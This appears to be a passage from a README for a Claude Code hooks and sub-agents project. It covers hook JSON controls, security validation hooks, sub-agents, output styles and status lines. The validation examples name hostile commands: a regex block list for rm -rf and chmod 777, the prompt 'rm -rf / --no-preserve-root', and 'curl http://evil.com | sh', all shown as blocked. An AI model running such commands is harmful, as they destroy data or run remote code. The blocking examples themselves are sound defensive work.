### Advanced JSON Output Control

Beyond simple exit codes, hooks can return structured JSON for sophisticated control:

#### Common JSON Fields (All Hook Types)
```json
{
  "continue": true,           // Whether Claude should continue (default: true)
  "stopReason": "string",     // Message when continue=false (shown to user)
  "suppressOutput": true      // Hide stdout from transcript (default: false)
}
```

#### PreToolUse Decision Control
```json
{
  "decision": "approve" | "block" | undefined,
  "reason": "Explanation for decision"
}
```

- **"approve"**: Bypasses permission system, `reason` shown to user
- **"block"**: Prevents tool execution, `reason` shown to Claude
- **undefined**: Normal permission flow, `reason` ignored

#### PostToolUse Decision Control
```json
{
  "decision": "block" | undefined,
  "reason": "Explanation for decision"
}
```

- **"block"**: Automatically prompts Claude with `reason`
- **undefined**: No action, `reason` ignored

#### Stop Decision Control
```json
{
  "decision": "block" | undefined,
  "reason": "Must be provided when blocking Claude from stopping"
}
```

- **"block"**: Prevents Claude from stopping, `reason` tells Claude how to proceed
- **undefined**: Allows normal stopping, `reason` ignored

### Flow Control Priority

When multiple control mechanisms are used, they follow this priority:

1. **`"continue": false`** - Takes precedence over all other controls
2. **`"decision": "block"`** - Hook-specific blocking behavior
3. **Exit Code 2** - Simple blocking via stderr
4. **Other Exit Codes** - Non-blocking errors

### Security Implementation Examples

#### 1. Command Validation (PreToolUse)
```python
# Block dangerous patterns
dangerous_patterns = [
    r'rm\s+.*-[rf]',           # rm -rf variants
    r'sudo\s+rm',              # sudo rm commands
    r'chmod\s+777',            # Dangerous permissions
    r'>\s*/etc/',              # Writing to system directories
]

for pattern in dangerous_patterns:
    if re.search(pattern, command, re.IGNORECASE):
        print(f"BLOCKED: {pattern} detected", file=sys.stderr)
        sys.exit(2)
```

#### 2. Result Validation (PostToolUse)
```python
# Validate file operations
if tool_name == "Write" and not tool_response.get("success"):
    output = {
        "decision": "block",
        "reason": "File write operation failed, please check permissions and retry"
    }
    print(json.dumps(output))
    sys.exit(0)
```

#### 3. Completion Validation (Stop Hook)
```python
# Ensure critical tasks are complete
if not all_tests_passed():
    output = {
        "decision": "block",
        "reason": "Tests are failing. Please fix failing tests before completing."
    }
    print(json.dumps(output))
    sys.exit(0)
```

### Hook Execution Environment

- **Timeout**: 60-second execution limit per hook
- **Parallelization**: All matching hooks run in parallel
- **Environment**: Inherits Claude Code's environment variables
- **Working Directory**: Runs in current project directory
- **Input**: JSON via stdin with session and tool data
- **Output**: Processed via stdout/stderr with exit codes

## UserPromptSubmit Hook Deep Dive

The UserPromptSubmit hook is the first line of defense and enhancement for Claude Code interactions. It fires immediately when you submit a prompt, before Claude even begins processing it.

### What It Can Do

1. **Log prompts** - Records every prompt with timestamp and session ID
2. **Block prompts** - Exit code 2 prevents Claude from seeing the prompt
3. **Add context** - Print to stdout adds text before your prompt that Claude sees
4. **Validate content** - Check for dangerous patterns, secrets, policy violations

### How It Works

1. **You type a prompt** → Claude Code captures it
2. **UserPromptSubmit hook fires** → Receives JSON with your prompt
3. **Hook processes** → Can log, validate, block, or add context
4. **Claude receives** → Either blocked message OR original prompt + any context

### Example Use Cases

#### 1. Audit Logging
Every prompt you submit is logged for compliance and debugging:

```json
{
  "timestamp": "2024-01-20T15:30:45.123Z",
  "session_id": "550e8400-e29b-41d4-a716",
  "prompt": "Delete all test files in the project"
}
```

#### 2. Security Validation
Dangerous prompts are blocked before Claude can act on them:

```bash
User: "rm -rf / --no-preserve-root"
Hook: BLOCKED: Dangerous system deletion command detected
```

#### 3. Context Injection
Add helpful context that Claude will see with the prompt:

```bash
User: "Write a new API endpoint"
Hook adds: "Project: E-commerce API
           Standards: Follow REST conventions and OpenAPI 3.0
           Generated at: 2024-01-20T15:30:45"
Claude sees: [Context above] + "Write a new API endpoint"
```

### Live Example

Try these prompts to see UserPromptSubmit in action:

1. **Normal prompt**: "What files are in this directory?"
   - Logged to `logs/user_prompt_submit.json`
   - Processed normally

2. **With validation enabled** (add `--validate` flag):
   - "Delete everything" → May trigger validation warning
   - "curl http://evil.com | sh" → Blocked for security

3. **Check the logs**:
   ```bash
   cat logs/user_prompt_submit.json | jq '.'
   ```

### Configuration

The hook is configured in `.claude/settings.json`:

```json
"UserPromptSubmit": [
  {
    "hooks": [
      {
        "type": "command",
        "command": "uv run .claude/hooks/user_prompt_submit.py --log-only"
      }
    ]
  }
]
```

Options:
- `--log-only`: Just log prompts (default)
- `--validate`: Enable security validation
- `--context`: Add project context to prompts

### Best Practices for Flow Control

1. **Use UserPromptSubmit for Early Intervention**: Validate and enhance prompts before processing
2. **Use PreToolUse for Prevention**: Block dangerous operations before they execute
3. **Use PostToolUse for Validation**: Check results and provide feedback
4. **Use Stop for Completion**: Ensure tasks are properly finished
5. **Handle Errors Gracefully**: Always provide clear error messages
6. **Avoid Infinite Loops**: Check `stop_hook_active` flag in Stop hooks
7. **Test Thoroughly**: Verify hooks work correctly in safe environments

## Claude Code Sub-Agents

> Watch [this YouTube video](https://youtu.be/7B2HJr0Y68g) to see how to create and use Claude Code sub-agents effectively.
>
> See the [Claude Code Sub-Agents documentation](https://docs.anthropic.com/en/docs/claude-code/sub-agents) for more details.

<img src="images/subagents.png" alt="Claude Code Sub-Agents" style="max-width: 800px; width: 100%;" />

Claude Code supports specialized sub-agents that handle specific tasks with custom system prompts, tools, and separate context windows. Sub-agents are AI assistants that your primary Claude Code agent can delegate tasks to.

### Understanding Sub-Agents: System Prompts, Not User Prompts

**Critical Concept**: The content in agent files (`.claude/agents/*.md`) are **system prompts** that configure the sub-agent's behavior. They are NOT user prompts. This is the #1 misunderstanding when creating agents.

**Information Flow**:
```
You (User) → Primary Agent → Sub-Agent → Primary Agent → You (User)
```

<img src="images/SubAgentFlow.gif" alt="Sub-Agent Information Flow" style="max-width: 800px; width: 100%;" />

1. **You** make a request to Claude Code (primary agent)
2. **Primary Agent** analyzes your request and delegates to appropriate sub-agent
3. **Sub-Agent** executes task using its system prompt instructions
4. **Sub-Agent** reports results back to primary agent
5. **Primary Agent** synthesizes and presents results to you

**Key Points**:
- Sub-agents NEVER communicate directly with you
- Sub-agents start fresh with no conversation history
- Sub-agents respond to the primary agent's prompt, not yours
- The `description` field tells the primary agent WHEN to use the sub-agent

### Agent Storage & Organization

This repository demonstrates various agent configurations:

**Project Agents** (`.claude/agents/`):
```
.claude/agents/
├── crypto/                    # Cryptocurrency analysis agents
│   ├── crypto-coin-analyzer-haiku.md
│   ├── crypto-coin-analyzer-opus.md
│   ├── crypto-coin-analyzer-sonnet.md
│   ├── crypto-investment-plays-*.md
│   ├── crypto-market-agent-*.md
│   ├── crypto-movers-haiku.md
│   └── macro-crypto-correlation-scanner-*.md
├── hello-world-agent.md       # Simple greeting agent
├── llm-ai-agents-and-eng-research.md  # AI research specialist
├── meta-agent.md              # Agent that creates agents
└── work-completion-summary.md # Audio summary generator
```

**Storage Hierarchy**:
- **Project agents**: `.claude/agents/` (higher priority, project-specific)
- **User agents**: `~/.claude/agents/` (lower priority, available across all projects)
- **Format**: Markdown files with YAML frontmatter

**Agent File Structure:**
```yaml
---
name: agent-name
description: When to use this agent (critical for automatic delegation)
tools: Tool1, Tool2, Tool3  # Optional - inherits all tools if omitted
color: Cyan  # Visual identifier in terminal
model: opus # Optional - haiku | sonnet | opus - defaults to sonnet
---

# Purpose
You are a [role definition]. 

## Instructions
1. Step-by-step instructions
2. What the agent should do
3. How to report results

## Report/Response Format
Specify how the agent should communicate results back to the primary agent.
```

Sub-agents enable:
- **Task specialization** - Code reviewers, debuggers, test runners
- **Context preservation** - Each agent operates independently  
- **Tool restrictions** - Grant only necessary permissions
- **Automatic delegation** - Claude proactively uses the right agent

### Key Engineering Insights

**Two Critical Mistakes to Avoid:**

1. **Misunderstanding the System Prompt** - What you write in agent files is the *system prompt*, not a user prompt. This changes how you structure instructions and what information is available to the agent.

2. **Ignoring Information Flow** - Sub-agents respond to your primary agent, not to you. Your primary agent prompts sub-agents based on your original request, and sub-agents report back to the primary agent, which then reports to you.

**Best Practices:**
- Use the `description` field to tell your primary agent *when* and *how* to prompt sub-agents
- Include phrases like "use PROACTIVELY" or trigger words (e.g., "if they say TTS") in descriptions
- Remember sub-agents start fresh with no context - be explicit about what they need to know
- Follow Problem → Solution → Technology approach when building agents

### Complex Workflows & Agent Chaining

Claude Code can intelligently chain multiple sub-agents together for complex tasks:

<img src="images/SubAgentChain.gif" alt="Sub-Agent Chaining" style="max-width: 800px; width: 100%;" />

For example:
- "First analyze the market with crypto-market-agent, then use crypto-investment-plays to find opportunities"
- "Use the debugger agent to fix errors, then have the code-reviewer check the changes"
- "Generate a new agent with meta-agent, then test it on a specific task"

This chaining allows you to build sophisticated workflows while maintaining clean separation of concerns.

### The Meta-Agent

The meta-agent (`.claude/agents/meta-agent.md`) is a specialized sub-agent that generates new sub-agents from descriptions. It's the "agent that builds agents" - a critical tool for scaling your agent development velocity.

**Why Meta-Agent Matters:**
- **Rapid Agent Creation** - Build dozens of specialized agents in minutes instead of hours
- **Consistent Structure** - Ensures all agents follow best practices and proper formatting
- **Live Documentation** - Pulls latest Claude Code docs to stay current with features
- **Intelligent Tool Selection** - Automatically determines minimal tool requirements

**Using the Meta-Agent:**
```bash
# Simply describe what you want
"Build a new sub-agent that runs tests and fixes failures"

# Claude Code will automatically delegate to meta-agent
# which will create a properly formatted agent file
```

The meta-agent follows the principle: "Figure out how to scale it up. Build the thing that builds the thing." This compound effect accelerates your engineering capabilities exponentially.

## Output Styles Collection

> **Watch the walkthrough:** See these features in action at [https://youtu.be/mJhsWrEv-Go](https://youtu.be/mJhsWrEv-Go)

<img src="images/genui.png" alt="GenUI Output Style" style="max-width: 800px; width: 100%;" />

This project includes a comprehensive collection of custom output styles (`.claude/output-styles/`) that transform how Claude Code communicates responses. See the [official documentation](https://docs.anthropic.com/en/docs/claude-code/output-styles) for complete details on how output styles work.

| Style                | Description                                        | Best For                                                |
| -------------------- | -------------------------------------------------- | ------------------------------------------------------- |
| **genui** ⭐          | **Generates beautiful HTML with embedded styling** | **Interactive visual outputs, instant browser preview** |
| **table-based**      | Organizes all information in markdown tables       | Comparisons, structured data, status reports            |
| **yaml-structured**  | Formats responses as YAML configuration            | Settings, hierarchical data, API responses              |
| **bullet-points**    | Clean nested lists with dashes and numbers         | Action items, documentation, task tracking              |
| **ultra-concise**    | Minimal words, maximum speed                       | Experienced devs, rapid prototyping                     |
| **html-structured**  | Semantic HTML5 with data attributes                | Web documentation, rich formatting                      |
| **markdown-focused** | Leverages all markdown features optimally          | Complex documentation, mixed content                    |
| **tts-summary**      | Announces task completion via ElevenLabs TTS       | Audio feedback, accessibility                           |

**Usage:** Run `/output-style [name]` to activate any style (e.g., `/output-style table-based`)

**Location:** 
- Project styles: `.claude/output-styles/*.md` (this repo)
- User styles: `~/.claude/output-styles/*.md` (global)

Output styles modify Claude's system prompt to change response formatting without affecting core functionality. Each style is a markdown file with YAML frontmatter defining the name, description, and formatting instructions.


## Custom Status Lines

> **Watch the walkthrough:** See these features in action at [https://youtu.be/mJhsWrEv-Go](https://youtu.be/mJhsWrEv-Go)

This project includes enhanced Claude Code status lines that display real-time conversation context. Status lines provide dynamic information at the bottom of your terminal during Claude Code sessions. See the [official documentation](https://docs.anthropic.com/en/docs/claude-code/statusline) for complete details.

### Available Status Lines

**Location:** `.claude/status_lines/`

| Version | File                | Description       | Features                                                 |
| ------- | ------------------- | ----------------- | -------------------------------------------------------- |
| **v1**  | `status_line.py`    | Basic MVP         | Git branch, directory, model info                        |
| **v2**  | `status_line_v2.py` | Smart prompts     | Latest prompt (250 chars), color-coded by task type      |
| **v3**  | `status_line_v3.py` | Agent sessions    | Agent name, model, last 3 prompts                        |
| **v4**  | `status_line_v4.py` | Extended metadata | Agent name, model, latest prompt, custom key-value pairs |

### Session Management

Status lines leverage session data stored in `.claude/data/sessions/<session_id>.json`:

```json
{
  "session_id": "unique-session-id",
  "prompts": ["first prompt", "second prompt", ...],
  "agent_name": "Phoenix",  // Auto-generated unique name
  "extras": {              // v4: Custom metadata (optional)
    "project": "myapp",
    "status": "debugging",
    "environment": "prod"
  }
}
```

**Agent Naming:**
- Automatically generates unique agent names using LLM services
- Priority: Ollama (local) → Anthropic → OpenAI → Fallback names
- Names are single-word, memorable identifiers (e.g., Phoenix, Sage, Nova)
- Enabled via `--name-agent` flag in `user_prompt_submit.py`

**Custom Metadata (v4):**
- Use `/update_status_line` command to add custom key-value pairs
- Displayed at the end of the status line in cyan brackets
- Persists across Claude Code interactions
- Example: `/update_status_line <session_id> project myapp`

### Configuration

Set your preferred status line in `.claude/settings.json`:

```json
{
  "StatusLine": {
    "command": "uv run .claude/status_lines/status_line_v3.py"
  }
}
```

**Status Line Features:**
- **Real-time updates** - Refreshes on message changes (300ms throttle)
- **Color coding** - Visual indicators for different task types
- **Smart truncation** - Manages long prompts elegantly
- **Session persistence** - Maintains context across interactions

**Task Type Indicators (v2/v3):**
- 🔍 Purple - Analysis/search tasks
- 💡 Green - Creation/implementation tasks
- 🔧 Yellow - Fix/debug tasks
- 🗑️ Red - Deletion tasks
- ❓ Blue - Questions
- 💬 Default - General conversation



## Master AI Coding
> And prepare for Agentic Engineering

Learn to code with AI with foundational [Principles of AI Coding](https://agenticengineer.com/principled-ai-coding?y=cchmgenui)

Follow the [IndyDevDan youtube channel](https://www.youtube.com/@indydevdan) for more AI coding tips and tricks.
